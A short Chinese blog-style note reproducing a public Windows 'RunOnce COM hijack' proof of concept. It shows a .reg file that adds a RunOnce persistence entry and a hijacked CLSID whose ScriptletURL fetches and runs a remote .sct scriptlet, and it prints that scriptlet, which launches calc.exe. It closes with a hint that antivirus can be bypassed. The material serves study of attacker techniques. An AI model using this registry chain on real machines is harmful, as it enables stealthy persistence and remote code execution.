### Runonce COM Hijack ###
早上在群内看见了个资源，COM劫持的。随便实验了一下

https://gist.github.com/homjxi0e/7894be4695e5f348a749ce5ec31bd314
https://twitter.com/harr0ey/status/1052405330402074624

github仓库里的内容是：
```
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce]

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\setup]
@="rundll32 xwizards.dll,RunPropertySheet /u {00000001-0000-0000-0000-0000FEEDACDC}"
"COM Hijacking"=""

Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Software\Classes\Scripting.Dictionary]
@=""

[HKEY_CURRENT_USER\Software\Classes\Scripting.Dictionary\CLSID]
@="{00000001-0000-0000-0000-0000FEEDACDC}"


[HKEY_CURRENT_USER\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}]
@="Scripting.Dictionary"

[HKEY_CURRENT_USER\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32]
@="C:\\WINDOWS\\system32\\scrobj.dll"
"ThreadingModel"="Apartment"

[HKEY_CURRENT_USER\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ProgID]
@="Scripting.Dictionary"

[HKEY_CURRENT_USER\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL]
@="https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSScripts/Payload/Slmgr_calc.sct"

[HKEY_CURRENT_USER\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\VersionIndependentProgID]
@="Scripting.Dictionary"
```

发现在注册表内添加了几个键
![](https://s2.ax1x.com/2019/06/09/VrtYsx.png)

![](https://s2.ax1x.com/2019/06/09/VrtsSA.png)

![](https://s2.ax1x.com/2019/06/09/VrtoSs.md.png)

![](https://s2.ax1x.com/2019/06/09/Vrt7yq.png)

ScriptletURL链接着一个URL
[calc](https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSScripts/Payload/Slmgr_calc.sct)

打开看了一眼，发现是使用js调用ActiveXobject("WScript.Shell").Run("calc.exe") 
```
<?XML version="1.0"?>
<scriptlet>

<registration
    description="Scripting.Dictionary"
    progid="Scripting.Dictionary"
    version="1"
    classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
    remotable="true"
	>
</registration>

<script language="JScript">
<![CDATA[

		var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
	
	
]]>
</script>

</scriptlet>
```

添加注册表的时候会被杀软拦截，可以使用一种让绕过杀软的办法来执行
